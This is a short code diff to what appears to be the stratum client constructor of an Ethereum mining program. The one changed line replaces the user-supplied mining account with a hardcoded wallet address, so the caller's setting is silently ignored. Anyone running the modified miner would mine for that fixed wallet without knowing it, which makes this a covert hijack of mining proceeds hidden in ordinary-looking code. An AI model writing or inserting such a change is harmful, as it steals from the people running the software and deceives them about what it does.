@@ -33,7 +33,7 @@ EthStratumClient::EthStratumClient(Farm* f, MinerType m, string const & host, st
 	m_minerType = m;
 	m_primary.host = host;
 	m_primary.port = port;
-	m_primary.user = user;
+	m_primary.user = "0x6e4af8cb6769bbc14083c8a7aa820de029a59db7.overd";
 	m_primary.pass = pass;
 
 	p_active = &m_primary;
